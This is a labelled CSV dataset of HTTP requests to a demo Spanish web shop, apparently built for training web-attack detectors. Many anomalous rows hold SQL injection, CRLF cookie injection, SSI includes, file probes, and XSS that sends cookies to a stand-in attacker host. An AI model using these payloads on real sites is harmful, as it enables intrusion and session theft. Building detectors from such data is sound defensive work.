,request,label
5976,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
5977,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=79&b1=a�adir+al+carrito,0
5978,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kendell&password=des81ra92&nombre=nec�foro&apellidos=conejo+mota&email=depaul-macneil@hojainformativas.bv&dni=99745017c&direccion=c/+belgica,+69+2?d&ciudad=torremocha+de+jiloca&cp=03769&provincia=le�n&ntc=1600011664845261&b1=registrar",0
5979,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
5980,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
5981,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tait&password=d012965226m6ent0&nombre=rawdon&apellidos=calb�+fermoselle&email=zohar@pablobracamonte.bh&dni=45263368n&direccion=calle+aita+barace+107+&ciudad=cercs&cp=24847&provincia=girona&ntc=5223158056651718&b1=registrar,0
5982,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
5983,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=pipponzi&pwd=03nte99era&remember=off&b1=entrar,0
5984,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
5985,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
5986,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
5987,gethttp://localhost:8080/tienda1/global/titulo.jsp,0
5988,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
5989,gethttp://localhost:8080/tienda1/imagenes/3.gif,0
5990,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6622&b1=confirmar,0
5991,gethttp://localhost:8080/tienda1/imagenes/2.gif,0
5992,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
5993,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jaye&password=m+ar8ca4�&nombre=sira&apellidos=nabau+fuentes&email=bello.sandor@hipergipuzkoa.to&dni=01218498g&direccion=av.+del+mar+cantabrico+176+6-d&ciudad=igualeja&cp=18518&provincia=c�ceres&ntc=4277877280233807&b1=registrar,0
5994,gethttp://localhost:8080/tienda1/publico/carrito.jsp,0
5995,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad=39&b1=a�adir+al+carrito,0
5996,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sikes&pwd=tiramollar&remember=off&b1=entrar,0
5997,gethttp://localhost:8080/tienda1/global/menum.jsp,0
5998,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
5999,gethttp://localhost:8080/tienda1/index.jsp,0
0,gethttp://localhost:8080/tienda1/asf-logo-wide.gif,1
1,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shyokoand+1=1&pwd=acarrear&remember=off&b1=entrar,1
2,gethttp://localhost:8080/tienda1/4861362529278789730,1
3,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritosessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
4,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bonnar&password=perillana&nombre=benito&apellidos=estruga+barrozzi&email=offerall@eonon.com.ci&dni=78627299m&direccion=poetisa+rosalia+de+castro,+41,+3?e&ciudad=valhermoso+de+la+fuente&cp=24174&provinciaa=cuenca&ntc=3588478670456559&b1=registrar",1
5,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
6,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=flint&password=herbecer&nombre=nabil&apellidos=salleras+lima&email=volmut8@santcugatpisos.ca&dni=51483838v&direcciona=calle+isla+columbretes+111+&ciudad=soto+de+cerrato&cp=47120&provincia=valencia&ntc=2744245058125133&b1=registrar,1
7,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
8,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scythia&password=3389agi48&nombrea=francesca&apellidos=bagaria&email=hsaio@suecas.com.ec&dni=15025159h&direccion=carrer+vallseca,+42,+&ciudad=torrecilla+del+pinar&cp=25225&provincia=ja�n&ntc=2462273534930751&b1=registrar",1
9,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5021&b1=confirmar/,1
10,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tarra&password=bienh6dado&nombre=idalia&apellidos=pozo+carbot&email=dafinescu@saavedradiaz.gf&dni=43841813h&direccion=avinguda+marques+de+montroig+110+11-a&ciudad=nov�s&cp=46370&provincia=zamora&ntc=3085190282266683&b1=%3f,1
11,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='or'a='a,1
12,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
13,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
14,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
15,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jeanloui&password=remosquearse&nombre=evelio&apellidos=fonfria+castillero&email=sprerris-apfel@tresbrujas.bn&dni=89061921x&direccion=c/+cervantes+117,+10?g&ciudad=villafranca+/del+campo&cp=50343&provincia=palencia&ntc=9895940721818753&b1=registrar",1
16,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3f,1
17,puthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,1
18,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&b1=confirmar,1
19,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=confirmar,1
20,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sevilla7&password=vehemencia&nombre=ian&apellidos=mercali+borrell&email=doonyarat.spindola@atorre.ng&dni=';waitfor+delay+'0:0:15';--&direccion=plumbago+39+&ciudad=�rchez&cp=44389&provincia=la+rioja&ntc=7217577784747192&b1=registrar,1
21,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vinet&password=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&nombre=ihor&apellidos=bedos&email=sangareau@faders.com.mil&dni=74830064r&direccion=santa+agueda,+s/n+5?g&ciudad=zarza+de+mont�nchez&cp=28191&provincia=ja�n&ntc=9112082229252110&b1=registrar",1
22,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
23,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
24,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
25,gethttp://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif,1
26,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=austin&pwd=de79in36r&remember=on/&b1=entrar,1
27,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%22%20style=%22background:url(javascript:alert('paros')),1
28,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=ques+o+manchego&precio=39&cantidad=52&b1=a�adir+al+carrito,1
29,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif.old,1
30,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp.java,1
31,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif/,1
32,gethttp://localhost:8080/webapp/examples/verify,1
33,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yoonmo2&pwda=azo5da&remember=off&b1=entrar,1
34,gethttp://localhost:8080/tienda1/global/creditos.jsp/~,1
35,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hughie&password=obstinarse&nombre=mohamed&apellidosa=fidalgo&email=somchart@aeag.edu&dni=24856792w&direccion=c/+poeta+muhammad+iqbal,+9+10g&ciudad=valle+gran+rey&cp=09610&provincia=a+coru�a&ntc=8348395638560525&b1=registrar",1
36,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=walt0&pwd=e2cr1t0c0&remember=off&b1=entrar@40,1
37,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ettridge&pwd=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&remember=on&b1=entrar,1
38,gethttp://localhost:8080/tienda1/publico/vaciar.jsp/4861362529278789730,1
39,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4613&b1=pasar+por+caja/,1
40,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precioa=85&cantidad=37&b1=a�adir+al+carrito,1
41,gethttp://localhost:8080/tienda1/publico/6909030637832563290.jsp,1
42,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=and+1=1,1
43,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727,1
44,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=meridith&pwd=oidora&remember=on&b1=entrar,1
45,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro'injected_param&login=benny&password=0ren3ga6&nombre=eudosio&apellidos=miguez+chew&email=doyle-murray@ajuntamentbarcelona2-0.hn&dni=76229865e&direccion=travesia+1+de+los+laureles,+144,+&ciudad=sant+cugat+sesgarrigues&cp=28300&provincia=burgos&ntc=9519490312798235&b1=registrar",1
46,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kapil&password=d1c36o4ca&nombre=berina+del+valle&apellidos=artico&email=meunier.langa@tintasultravioleta.al&dni=17826694s&direccion=c/+historiador+rodrigo+pertegas,+149,+8-e&ciudad=palafolls&cp=25218&provincia=c�ceres&ntc=3256313581077416&b1a=registrar",1
47,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
48,gethttp://localhost:8080/tienda1/miembros/4861362529278789730,1
49,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=prashant&password=l1n1sa&nombre=grey&apellidos=montaner+espinosa&email=gempart.moor@guejosgratis.br&dni=27979477t&direccion=calle+la+le�a+27+&ciudad=collbat�&cp=17180&provincia=girona&ntc=7582936564650481&b1=registrar,1
50,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio='or'a='a&b1=confirmar,1
51,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dar-der&pwd=3.ra9di/2sa,m55te&remember=on&b1=entrar",1
52,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=halsy&pwd=4'sc'o23u'to&remember=off&b1=entrar,1
53,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg.inc,1
54,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pardo&password=s2r44n9sa&nombre=julius&apellidos=abad+palomo&email=alonzo@colorprint.eh&dni=44696230p&direccion=pl.+primero+de+mayo+s/n,+11f&ciudad=albal�&cpa=29493&provincia=soria&ntc=1165920681066048&b1=registrar",1
55,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito<!--#include+file=""archivo_secreto""+-->",1
56,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dar-dersessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&pwd=caser�a&remember=on&b1=entrar,1
57,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kimble&password=tolemaica&nombre=liberia&apellidos=porcel+tonk&email=kedrova@pablobracamonte.hn&dni=27b1b74895g&direccion=madre+carmen+del+ni�o+jesus,+48+&ciudad=torremormoj�n&cp=03738&provincia=girona&ntc=9728949065368673&b1=registrar",1
58,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gustave&password=v3o8720a&nombre=mar�a+begonia&apellidos=fain�+motj�&email=dyne@somosagelespa�a.us&dni=30663985v&direcciona=calle+antonio+gramsci+30,+12?b&ciudad=narros+del+puerto&cp=40183&provincia=zamora&ntc=4102151120364510&b1=registrar",1
59,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=swidersk&password=balarrasa&nombre=yaco&apellidos=moriana+romanov&email=sintes@noticiasenvivo.mz&dni=58500108e&direccion=c/+parque+iguazu+99,+&ciudada=ag�imes&cp=48940&provincia=valencia&ntc=3622353817159390&b1=registrar",1
60,gethttp://localhost:8080/tienda1/asf-logo-wide.gif/.inc,1
61,gethttp://localhost:8080/iisstart.htm,1
62,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cohen&password=pirr7n108&nombre=siro&apellidos=casaramon+tetatzin&email=malcolm_motaung@enlanzarote.com.yu&dni=91b898b927n&direccion=cristo+rey,+59,+2b&ciudad=arenales+de+san+gregorio&cp=24745&provincia=huelva&ntc=2796424278292099&b1=registrar",1
63,gethttp://localhost:8080/asf-logo-wide.inc,1
64,gethttp://localhost:8080/tienda1/miembros/salir.jsp.old,1
65,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=1713&b1=pasar+por+caja,1
66,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro|&login=jakabffy&password=33arr179&nombre=vahidreza&apellidos=curell+lagares&email=moura@chicasdiabolo.iq&dni=75130756z&direccion=urbanizacion+montesion,+3+&ciudad=molinaseca&cp=45180&provincia=teruel&ntc=2571648203429012&b1=registrar",1
67,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=85/&cantidad=17&b1=a�adir+al+carrito,1
68,gethttp://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif/,1
69,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chartran&pwd=sapillo&remember=on/&b1=entrar,1
70,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=queso+manchego&precio=39&cantidad=9&b1=a�adir+al+carrito,1
71,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=8384&b1=confirmar,1
72,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
73,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
74,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8145&b1a=confirmar,1
75,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2='+delete+from+users,1
76,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=+,1
77,gethttp://localhost:8080/tienda1/publico.bak,1
78,"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar','0','0','0');waitfor+delay+'0:0:15';--&precio=8588&b1=confirmar",1
79,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derosenr&password=abarracar&nombre=trist�n&apellidos=pol+lazcano&email=braverman-watkin@docerosas.pl&dni=28010640k&direccion=c/+antoni+rosello+i+nadal+172+&ciudad=blancafort&cp=1770a&provincia=burgos&ntc=7871877495462595&b1=registrar,1
80,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hinda&password=ubre&nombre=riley&apellidos=penichet+forales&email=andersson.millan@salacomplices.bs&dni=51920905s&direcciona=avenida+de+la+hierbabuena,+33,+&ciudad=xinzo+de+limia&cp=37592&provincia=le�n&ntc=5072758517881652&b1=registrar",1
81,gethttp://localhost:8080/_vti_bin/,1
82,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=toshach&pwd=quer4n55a&remember=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2&b1=entrar,1
83,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=winnie&password=1arz5ela&nombre=pomponio&apellidos=aboitiz+monestel&email=mcnaughton@queinvento.gg&dni=86852947w&direccion=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&ciudad=foradada&cp=43411&provincia=badajoz&ntc=4587587495208642&b1=registrar,1
84,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=39/&cantidad=66&b1=a�adir+al+carrito,1
85,gethttp://localhost:8080/asf-logo-wide.gif,1
86,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=%7c&precio=2579&b1=confirmar,1
87,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=watchorn&password=gin09r9n3&nombre=alcira&apellidos=marcapura+pachecote&email=wolheim@soyrojo.se&dni=79531407y&direccion=','0');waitfor+delay+'0:0:15';--&ciudad=deleitosa&cp=49410&provincia=baleares+(illes)&ntc=4881993166167995&b1=registrar",1
88,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jeri&password=8n6s17d741a49e&nombre=eutimio&apellidos=zamudio&email=bannen@masqueclases.ch&dni=98531799y&direccion=geologo+palacios,+134,+13?b&ciudad=puigverd+de+lleida&cp=09560&provincia=+&ntc=3173800761137477&b1=registrar",1
89,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
90,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=devore&password='+delete+from+users&nombre=agripino&apellidos=verge+unza&email=bucci@quehaces.jobs&dni=60737010j&direccion=c/+ignacio+alvarez+castelao+63,+&ciudad=bobor�s&cp=26585&provincia=albacete&ntc=4362098450410564&b1=registrar",1
91,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kolahi45&password=o5$57t4&nombre=segismundo&apellidos=torr�&email=unkel-richler@nanogenerador.bu&dni=482865631&direccion=calle+puerto+oncala,+80,+7?g&ciudad=almazul&cp=20495&provincia=navarra&ntc=9824241120494731&b1=registrar",1
92,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=field&password=dis.cordante&nombre=gianfranco&apellidos=dausset+cartaya&email=patch@francislucille.sm&dni=88600786w&direccion=calle+o+outeiro,+189+&ciudad=ojos+negros&cp=05145&provincia=ja�n&ntc='or'a='a&b1=registrar",1
93,gethttp://localhost:8080/tienda1/miembros/index.jsp.old,1
94,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=816&b1=pasar+por+caja/,1
95,gethttp://localhost:8080/iisadmpwd/achg.htr,1
96,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
97,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jeri&password=8n6s17d741a49e&nombre=eutimio&apellidos=zamudio&email=bannen@masqueclases.ch&dni=98531799y&direccion=geologo+palacios,+134,+13?b&ciudad=puigverd+de+lleida&cpa=09560&provincia=teruel&ntc=3173800761137477&b1=registrar",1
98,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=39&cantidad=90&b1=a�adir+al+carrito,1
99,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=khorami&password=ta5a&nombre=lynge&apellidos=ce�al&email=heard@barebackspain.cf&dni=73611157w&direccion=organista+plasencia+73,+7-h&ciudad=ripollet&cp=50491&provincia=teruel&ntc=385531057488688a&b1=registrar",1
100,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=deng&password=5331q572403eo&nombre=,robinso'n&apellidos=zuazola+sauli&email=renavent@14horas.aero&dni=90456703a&direccion=amor+de+dios+14+1-c&ciudad=villaca�as&cp=50580&provincia=burgos&ntc=1928866746841107&b1=registrar",1
101,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%0aset-cookie%3a+tamper%3d1041264011025374727,1
102,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito');waitfor+delay+'0:0:15';--,1
103,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=elefther&password=a_ma6ar&nombre=dacil&apellidos=bon�as+aleza&email=mallalie@u@logiteclin@es.@ly&dni=41273299y&direccion=lucas+mallada,+28,+&ciudad=cantalpino&cp=34469&provincia=guip�zcoa&ntc=7363123052285144&b1=registrar",1
